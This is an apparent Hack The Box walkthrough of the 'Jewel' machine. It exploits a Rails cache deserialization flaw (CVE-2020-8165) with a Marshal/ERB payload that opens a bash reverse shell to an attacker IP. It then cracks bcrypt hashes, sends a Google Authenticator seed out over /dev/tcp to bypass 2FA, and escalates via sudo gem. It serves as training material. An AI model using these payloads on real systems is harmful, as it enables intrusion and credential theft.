@@ -1,0 +1,246 @@
+JEWEL - HAck the Box
+
+Multiple ports open, specifacllly ssh, 2 http high ports. 22,8000, 8080
+
+Gitweb being used on port 8000. gitweb/2.20.1 git/2.20.1
+
+WebPassenger on port 8080. nginx/1.14.2 + Phusion Passenger 6.0.6, integrates with apahce or nginx
+Earch for release notes
+
+Commands and Output:
+====================================================================================================================================
+searchsploit phusion
+====================================================================================================================================
+
+We can go to http://10.10.10.211:8000/gitweb/ and click on summary and download the sourcecode provided from the snapshot.
+
+
+Commands and Output:
+====================================================================================================================================
+tar xvf git-5d6f436.tar.gz
+cd .git-5d6f436
+sudo gem install brakeman
+brakeman
+====================================================================================================================================
+
+We see config.ru explaining that is most likely a ruby application. We can use brakeman to further analyze the ruby application.
+Static code analyzer for ruby. We can now run it inside of the application directory.
+
+Commands and Output:
+====================================================================================================================================
+== Brakeman Report ==
+
+Application Path: /home/user/htb/jewel/.git-5d6f436
+Rails Version: 5.2.2.1
+Brakeman Version: 5.0.0
+Scan Date: 2021-04-05 11:51:38 -0700
+Duration: 0.235760199 seconds
+Checks Run: BasicAuth, BasicAuthTimingAttack, CSRFTokenForgeryCVE, ContentTag, CookieSerialization, CreateWith, CrossSiteScripting, DefaultRoutes, Deserialize, DetailedExceptions, DigestDoS, DivideByZero, DynamicFinders, EscapeFunction, Evaluation, Execute, FileAccess, FileDisclosure, FilterSkipping, ForceSSL, ForgerySetting, HeaderDoS, I18nXSS, JRubyXML, JSONEncoding, JSONEntityEscape, JSONParsing, LinkTo, LinkToHref, MailTo, MassAssignment, MimeTypeDoS, ModelAttrAccessible, ModelAttributes, ModelSerialize, NestedAttributes, NestedAttributesBypass, NumberToCurrency, PageCachingCVE, PermitAttributes, QuoteTableName, Redirect, RegexDoS, Render, RenderDoS, RenderInline, ResponseSplitting, ReverseTabnabbing, RouteDoS, SQL, SQLCVEs, SSLVerify, SafeBufferManipulation, SanitizeMethods, Secrets, SelectTag, SelectVulnerability, Send, SendFile, SessionManipulation, SessionSettings, SimpleFormat, SingleQuotes, SkipBeforeFilter, SprocketsPathTraversal, StripTags, SymbolDoS, SymbolDoSCVE, TemplateInjection, TranslateBug, UnsafeReflection, UnsafeReflectionMethods, UnscopedFind, ValidationRegex, VerbConfusion, WeakHash, WithoutProtection, XMLDoS, YAMLParsing
+
+== Overview ==
+
+Controllers: 5
+Models: 4
+Templates: 19
+Errors: 0
+Security Warnings: 7
+
+== Warning Types ==
+
+Cross-Site Request Forgery: 1
+Missing Encryption: 1
+
+====================================================================================================================================
+
+Not much is found about potential exploits, we see the rails version "Rails Version: 5.2.2.1" we come to find that rails version
+is from  March 13, 2019 (6.5 KB), about a year older than the box itself so it might have a potential exploit.
+
+We can look for a rails cve. https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=rails
+
+CVE-2020-8165 	A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.
+
+The exploit of this box seems to be a serialization vulnerability. We further search for poc for the vulnerability and see if 
+anything comes up. "CVE-2020-8165 poc": https://github.com/masahiro331/CVE-2020-8165
+
+There is a google docs link that further explains the vulnerability and how we might find pieces of line code in our code directory.
+The string in question being "raw: true". So we search from the code directory we found it in.
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/jewel/.git-5d6f436]
+└──╼ $grep -Ri "raw: true" .
+./app/controllers/application_controller.rb:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do
+./app/controllers/users_controller.rb:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+./app/controllers/application_controller.rb
+ 32       @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do$
+ ./app/controllers/users_controller.rb:
+ 37       @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}$
+====================================================================================================================================
+Looks like the raw string is under the update function, which means we can update our user and send a value directory into the cache
+database as a string and place as a serialized object
+
+Looking at the poc we create the cached object to put in and print to the screen our url encoded payload.
+So we go to sign up and create our user: http://10.10.10.211:8080/
+user hacker email: root@hacker.com password: password
+
+We then login and then we can edit our profile which allows us to edit our username which is where will deploy our payload.
+We need to install rails, bundle and other neccesary components for the exploit.
+
+Commands and Output:
+====================================================================================================================================
+sudo apt install rails
+### There appears to be error on updating rails, troubleshoot commands below for when keys are expired
+sudo apt-key adv --keyserver keys.gnupg.net --recv-keys {PUBLIC_KEY_GOES_HERE}
+====================================================================================================================================
+
+We can now create a new rails project.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/jewel/blog]
+└──╼ $rails new exploit
+┌─[user@parrot-virtual]─[~/htb/jewel/blog]
+└──╼ $cd exploit/
+┌─[user@parrot-virtual]─[~/htb/jewel/blog/exploit]
+└──╼ $ls
+app              bin     config.ru  Gemfile       lib  node_modules  postcss.config.js  Rakefile   storage  tmp     yarn.lock
+babel.config.js  config  db         Gemfile.lock  log  package.json  public             README.md  test     vendor
+┌─[user@parrot-virtual]─[~/htb/jewel/blog/exploit]
+└──╼ $bundle exec rails console
+====================================================================================================================================
+
+So using the poc code we can now go in and use our own custom payload to generate a reverse shell.
+Quick note: payload in marhsal.dump needs an "=" sign.
+
+Commands and Output:
+====================================================================================================================================
+code = '`/bin/bash -c "bash -i >& /dev/tcp/10.10.14.23/5555 0>&1"`'
+erb = ERB.allocate
+erb.instance_variable_set :@src, code
+erb.instance_variable_set :@filename, "1"
+erb.instance_variable_set :@lineno, 1
+payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
+puts "Payload"
+require 'uri'
+puts URI.encode_www_form(payload: payload)
+
+payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3F%60%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.23%2F5555+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
+====================================================================================================================================
+
+Now that we have our payload created we can use burpsuite. To send the payload.
+Commands and Output:
+====================================================================================================================================
+utf8=%E2%9C%93&_method=patch&authenticity_token=VdIcXXUbTOLLAglM%2FuCMAfu%2FuGK%2BfUOcnrcDY9zE8T4DB65U1K7UrX4Vcy0LSy3zOH9dp4zEAZ5nJ1UggqUZUA%3D%3D&user%5Busername%5D=hacker&commit=Update+User
+##### We modify the username field such that prior to sending the username it insteasd sends our serialized payload.
+utf8=%E2%9C%93&_method=patch&authenticity_token=VdIcXXUbTOLLAglM%2FuCMAfu%2FuGK%2BfUOcnrcDY9zE8T4DB65U1K7UrX4Vcy0LSy3zOH9dp4zEAZ5nJ1UggqUZUA%3D%3D&user%5Busername%5D=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3F%60%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.23%2F5555+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&commit=Update+User
+
+nc -lnvp 5555
+====================================================================================================================================
+
+After sending be sure not to refresh the page otherwise it will not send the serialized payload. Just hit enter on the url line to
+have it execute.
+
+Now that we have a reverse shell via the exploit we can go ahead and transfer linpeas and scope out the machine.
+Based on the output we find a couple of password hashes that linpeas found
+Commands and Output:
+====================================================================================================================================
+[+] Searching specific hashes inside files - less false positives (limit 70)
+/var/backups/dump_2020-08-27.sql:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
+/var/backups/dump_2020-08-27.sql:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW
+/home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+/home/bill/blog/bd.sql:$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
+====================================================================================================================================
+
+We look through those files that had the hashes and explore if more were there or not. Looks like the hashes were all swept and 
+hashing algorithm is bcrypt, we can now use hashcat to crack them.
+Commands and Output:
+====================================================================================================================================
+./hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt 
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force
+====================================================================================================================================
+
+After running hashcat we are able to find the password for one of the hashes, bills in this case
+Commands and Output:
+====================================================================================================================================
+$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob
+====================================================================================================================================
+
+Lets see if we can sudo, apparently we can but we get the following.
+Commands and Output:
+====================================================================================================================================
+bill@jewel:/var/backups$ sudo -l 
+[sudo] password for bill: 
+Verification code: 
+====================================================================================================================================
+
+A verification is being asked in order to permit sudo access. It appears to be a 2 factor authentication. Specifcally a google two 
+factor auth. If we go to our home directory we find the following file : .google_authenticator which appears to be some kind of seed.
+
+We can transfer the file to our local mahcine to further analyze it.
+Commands and Output:
+====================================================================================================================================
+bill@jewel:~$ cat .google_authenticator > /dev/tcp/10.10.14.23/9001
+┌─[user@parrot-virtual]─[~/htb/jewel]
+└──╼ $nc -lnvp 9001 > google_auth
+listening on [any] 9001 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.211] 41652
+┌─[user@parrot-virtual]─[~/htb/jewel]
+└──╼ $ls
+blog  flags  git-5d6f436.tar.gz  google_auth  hashes.txt  nmap  notes.txt
+┌─[user@parrot-virtual]─[~/htb/jewel]
+└──╼ $cat google_auth 
+2UQI3R52WFCLE6JTLDCSJYMJH4
+" WINDOW_SIZE 17
+" TOTP_AUTH
+
+====================================================================================================================================
+
+We will now install oauth to out local box
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/Downloads]
+└──╼ $sudo apt install oathtool
+
+┌─[user@parrot-virtual]─[~/htb/jewel]
+└──╼ $oathtool @google_auth
+oathtool: hex decoding of secret key failed
+┌─[✗]─[user@parrot-virtual]─[~/htb/jewel]
+└──╼ $oathtool @google_auth -b
+059979
+
+
+====================================================================================================================================
+
+We use the -b option to decode in hex and we get a key. We enter the code however we still keep getting errors.
+Looks like we might need to get the totp option to make it time senistive.
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/jewel]
+└──╼ $oathtool @google_auth -b --totp
+958870
+bill@jewel:~$ sudo -l 
+Matching Defaults entries for bill on jewel:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    insults
+
+User bill may run the following commands on jewel:
+    (ALL : ALL) /usr/bin/gem
+====================================================================================================================================
+
+
+Looks like we get access by enetering the time sensitive code and looking gtfo bins for possible abuse of /usr/bin/gem
+Commands and Output:
+====================================================================================================================================
+bill@jewel:~$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
+# whoami
+root
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
